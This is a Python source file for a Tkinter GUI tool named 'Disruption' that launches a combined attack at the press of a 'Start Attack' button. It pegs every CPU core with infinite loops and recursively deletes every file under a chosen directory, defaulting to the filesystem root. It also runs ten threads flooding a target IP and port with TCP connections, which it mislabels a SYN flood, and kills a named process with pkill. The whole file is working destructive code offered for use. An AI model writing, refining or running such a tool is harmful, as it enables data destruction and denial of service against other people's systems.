import tkinter as tk
from tkinter import ttk
import multiprocessing
import os
import time
import socket
import threading
import random
import subprocess

class SystemDisruptionApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Disruption")

        # Header
        self.header_label = ttk.Label(root, text="Disruption", font=('Arial', 18, 'bold'))
        self.header_label.grid(row=0, column=0, columnspan=2, padx=5, pady=5)

        self.target_ip_var = tk.StringVar()
        self.target_port_var = tk.StringVar()
        self.important_directory_var = tk.StringVar()
        self.critical_process_var = tk.StringVar()

        # Labels and Entry Widgets
        ttk.Label(root, text="Target IP:").grid(row=1, column=0, padx=5, pady=5)
        self.target_ip_entry = ttk.Entry(root, textvariable=self.target_ip_var)
        self.target_ip_entry.grid(row=1, column=1, padx=5, pady=5)

        ttk.Label(root, text="Target Port:").grid(row=2, column=0, padx=5, pady=5)
        self.target_port_entry = ttk.Entry(root, textvariable=self.target_port_var)
        self.target_port_entry.grid(row=2, column=1, padx=5, pady=5)

        ttk.Label(root, text="Important Directory:").grid(row=3, column=0, padx=5, pady=5)
        self.important_directory_entry = ttk.Entry(root, textvariable=self.important_directory_var)
        self.important_directory_entry.grid(row=3, column=1, padx=5, pady=5)

        ttk.Label(root, text="Critical Process Name:").grid(row=4, column=0, padx=5, pady=5)
        self.critical_process_entry = ttk.Entry(root, textvariable=self.critical_process_var)
        self.critical_process_entry.grid(row=4, column=1, padx=5, pady=5)

        # Start Button
        self.start_button = ttk.Button(root, text="Start Attack", command=self.start_attack)
        self.start_button.grid(row=5, column=0, columnspan=2, padx=5, pady=5)

        # Footer
        self.footer_label = ttk.Label(root, text="Built by DeadmanXXXII", font=('Arial', 10, 'italic'))
        self.footer_label.grid(row=6, column=0, columnspan=2, padx=5, pady=5)

    def start_attack(self):
        target_ip = self.target_ip_var.get()
        target_port = int(self.target_port_var.get())
        important_directory = self.important_directory_var.get()
        critical_process = self.critical_process_var.get()

        # Start the attack in a separate thread
        threading.Thread(target=self.disrupt_system, args=(target_ip, target_port, important_directory, critical_process)).start()

    def cpu_stress(self):
        while True:
            pass  # Infinite loop to consume CPU resources

    def delete_files(self, path="/"):
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                    print(f"Deleted file: {os.path.join(root, file)}")
                except Exception as e:
                    print(f"Error deleting file {file}: {e}")

    def syn_flood(self, target_ip, target_port):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                s.close()
                print(f"SYN Flood sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error sending SYN Flood to {target_ip}:{target_port}: {e}")

    def kill_process(self, process_name):
        try:
            subprocess.call(['pkill', '-f', process_name])
            print(f"Process {process_name} killed")
        except Exception as e:
            print(f"Error killing process {process_name}: {e}")

    def disrupt_system(self, target_ip, target_port, important_directory, critical_process):
        # Start CPU Stress Processes
        num_cores = multiprocessing.cpu_count()
        for _ in range(num_cores):
            p = multiprocessing.Process(target=self.cpu_stress)
            p.start()

        # Start File Deletion Thread
        threading.Thread(target=self.delete_files, args=(important_directory,)).start()

        # Start SYN Flood Threads
        for _ in range(10):
            threading.Thread(target=self.syn_flood, args=(target_ip, target_port)).start()

        # Start Process Killing Thread
        threading.Thread(target=self.kill_process, args=(critical_process,)).start()

        # Monitor the attack progress and print output to terminal
        print("\n" + "="*40)
        print("System Disruption Attack Initiated")
        print("="*40)
        print("Target IP:", target_ip)
        print("Target Port:", target_port)
        print("Important Directory:", important_directory)
        print("Critical Process Name:", critical_process)
        print("="*40)
        print("Attack in progress...")
        print("="*40)
        while True:
            time.sleep(10)
            print("Monitoring attack progress...")

# Create the Tkinter application
root = tk.Tk()
app = SystemDisruptionApp(root)
root.mainloop()